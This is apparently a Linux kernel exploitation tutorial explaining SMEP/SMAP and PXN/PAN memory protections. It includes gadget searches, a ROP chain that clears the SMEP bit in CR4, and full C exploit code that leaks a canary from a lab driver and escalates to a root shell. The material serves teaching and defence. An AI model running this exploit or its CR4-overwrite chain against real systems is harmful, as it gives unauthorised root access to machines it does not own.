# **02.Segregation of kernel memory from userspace memory (x86 SMEP/SMAP, ARM PXN/PAN)**

* The kernel must not directly execute or access user space memory during supervisor mode operations.
* This policy is enforced via hardware security features (SMEP/SMAP on x86, PXN/PAN on ARM) or memory domain emulation.
* By blocking access to user space memory from Ring 0 / EL1, exploits can no longer simply redirect kernel execution directly to user-mode payloads (ret2usr).

## **SMEP & SMAP**

### **SMEP (Supervisor Mode Execution Prevention)**

* Hardware mitigation introduced by Intel (Intel OS Guard) that prevents the CPU from executing instructions from user space pages while in supervisor (kernel) mode (Ring 0).
* An attempt to execute code residing on user-mode pages generates a page fault / kernel crash.
* Defeats classic `ret2usr` techniques that jump directly into user space memory buffers.

### **SMAP (Supervisor Mode Access Prevention)**

* Prevents the kernel from reading or writing user space linear memory while in supervisor mode unless explicitly unlocked (e.g. via `STAC` / `CLAC` instructions).
* Defeats fake structure attacks where kernel pointers reference attacker-controlled user-mode memory directly.

## **PXN & PAN**

### **PXN (Privileged Execute-Never)**

* ARM hardware feature analogous to x86 SMEP that marks user space memory pages as non-executable when running in privileged (EL1) mode.

:::info
* <http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dai0425/BABCDECH.html>
* <https://developer.arm.com/architectures/learn-the-architecture/armv8-a-memory-model/permissions-attributes>
* <https://keenlab.tencent.com/en/2016/06/01/Emerging-Defense-in-Android-Kernel/>
* <https://kernel.googlesource.com/pub/scm/linux/kernel/git/jic23/iio/+/8e620b0476696e9428442d3551f3dad47df0e28f>
:::

### **PAN (Privileged Access Never)**

* Introduced in ARMv8.1, analogous to x86 SMAP. Prevents privileged execution from accessing unprivileged user space data addresses.

:::info
* <https://lwn.net/Articles/651614/>
* <https://developer.arm.com/docs/ddi0595/b/aarch64-system-registers/pan>
:::

## **CR4 Register**

* On x86/x86-64, processor architecture features are controlled by the `CR4` register.
  + Bit 20: **SMEP** (1 = enabled, 0 = disabled)
  + Bit 21: **SMAP** (1 = enabled, 0 = disabled)

:::note[CR4 Register]
![](/img/attachments/25624859/45350934.png)
:::

:::info
PXN and PAN on ARM are managed through page table permission bits and system control registers rather than x86 control registers.
:::

## **Proof of concept**

### **SMEP bypass**

* **Bypassing SMEP:**
  + Approach 1: Disable SMEP dynamically by modifying the `CR4` register value via a ROP gadget before returning to user space.
  + Approach 2: Execute pure kernel ROP chains (as in [03.Stack smashing(64bit) & ROP](../03.linux-kernel-ex-617/03.stack-smashing6-535.md)).
* **CR4 modification approach:**
  + Find a `mov cr4, rdi` gadget to overwrite `CR4`:

```sh title="Find mov cr4,rdi gadget"
lazenca0x0@ubuntu:~/Kernel/SS$ objdump -M intel -j .text -d /usr/lib/debug/boot/vmlinux-4.4.0-31-generic |grep "mov    cr4,rdi"
ffffffff8101a9e0:	0f 22 e7             	mov    cr4,rdi
ffffffff810612f4:	0f 22 e7             	mov    cr4,rdi
lazenca0x0@ubuntu:~/Kernel/SS$
```

* Find `pop rdi ; ret`:

```sh title="Find pop rdi ; ret gadget"
lazenca0x0@ubuntu:~/Kernel/SS$ ./rp-lin-x64 -f /usr/lib/debug/boot/vmlinux-4.4.0-31-generic -r 1|grep "pop rdi ; ret" | head -1
0xffffffff813e223f: pop rdi ; ret  ;  (1 found)
lazenca0x0@ubuntu:~/Kernel/SS$
```

* Clear bit 20 (`0x100000`) from current CR4 (`0x1406f0` -> `0x406f0`):
  + Load `0x406f0` into `rdi` and execute `mov cr4, rdi` before calling user space `payload()`.

```c title="Build ROP chain"
...
    rop[k++] = canary;
    rop[k++] = 0;
    rop[k++] = 0;
    rop[k++] = 0;
    rop[k++] = 0xffffffff813e223f;	// pop rdi ; ret
    rop[k++] = 0x406f0;				// CR4 without SMEP bit
    rop[k++] = 0xffffffff8101a9d0;	// mov cr4, rdi ; ... ; ret
    rop[k++] = (size_t)payload;
...
```

## **Exploit code**

```c title="Exploit code(r2u_smep.c)"
//gcc -masm=intel -static -o r2u_smep r2u_smep.c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdint.h>
   
#define TEXT_LEN 64
  
void *(*prepare_kernel_cred)(void *) ;
int (*commit_creds)(void *) ;
  
struct trap_frame {
    void     *user_rip;		// instruction pointer
    uint64_t user_cs;		// code segment
    uint64_t user_rflags;	// CPU flags
    void     *user_rsp;		// stack pointer
    uint64_t user_ss;		// stack segment
} __attribute__((packed));
struct trap_frame tf;
   
void getShell(void) {
    execl("/bin/sh", "sh", NULL);
}
   
void prepare_tf(void) {
    asm("mov tf+8, cs;"
        "pushf; pop tf+16;"
        "mov tf+24, rsp;"
        "mov tf+32, ss;"
        );
    tf.user_rip = &getShell ;
}
    
void payload(void)
{
    commit_creds(prepare_kernel_cred(0));
    asm("swapgs;"
        "mov %%rsp, %0;"
        "iretq;"
    : : "r" (&tf));
}
  
void *kallsym_getaddr(char *name)
{
    FILE *fp;
    void *addr;
    char sym[512];
   
    fp = fopen("/proc/kallsyms", "r");
    while (fscanf(fp, "%p %*c %512s\n", &addr, sym) > 0) {
        if (strcmp(sym, name) == 0) {
            break;
        }else{
            addr = NULL;
        }
    }
    fclose(fp);
    return addr;
}
  
int main()
{
    static char buf[512];
    size_t rop[512] = {0};
    char val[8];
    int fd,i,j;
 
    //Find the addresss of "commit_creds()"
    commit_creds = kallsym_getaddr("commit_creds");
    if(commit_creds == 0)
    {
        printf("failed to get commit_creds addresss\n");
        return 0;
    }
    printf("commit_creds addresss is :%p\n",commit_creds);
  
    //Find the addresss of "prepare_kernel_cred()"
    prepare_kernel_cred = kallsym_getaddr("prepare_kernel_cred");
    if(prepare_kernel_cred == 0)
    {
        printf("failed to get prepare_kernel_cred addresss\n");
        return 0;
    }
    printf("prepare_kernel_cred addresss is :%p\n",prepare_kernel_cred);
  
    //leak the canary
    if ((fd = open("/dev/chardev0", O_RDWR)) < 0){
        printf("Cannot open /dev/chardev0. Try again later.\n");
        return 0;
    }
  
    lseek(fd, 16, SEEK_CUR);
    read(fd, buf, TEXT_LEN);
  
    for (i = 0; i < 4; i++)
    {
        for (j = 0; j < 16; j++) printf("%02x ", buf[i*16+j] & 0xff);
        printf(" | ");
        for (j = 0; j < 16; j++) printf("%c", buf[i*16+j] & 0xff);
        printf("\n");
    }
  
    memcpy(val, buf+48,8);
    size_t canary = ((size_t *)val)[0];

    printf("[+]canary: %p\n", (void *)canary);
  
    //Exploit code
    int k = 8;
    memset(&rop[0], 0x41, 64);
    rop[k++] = canary;
    rop[k++] = 0;
    rop[k++] = 0;
    rop[k++] = 0;
    rop[k++] = 0xffffffff813e223f;	//pop_rdi
    rop[k++] = 0x406f0;				//CR4 with SMEP cleared
    rop[k++] = 0xffffffff8101a9d0;	//mov cr4, rdi
    rop[k++] = (size_t)payload;
    
    prepare_tf();
  
    //Overflow
    write(fd, rop, 8*(k+1));
  
    if (close(fd) != 0){
        printf("Cannot close.\n");
    }
    return 0;
}
```
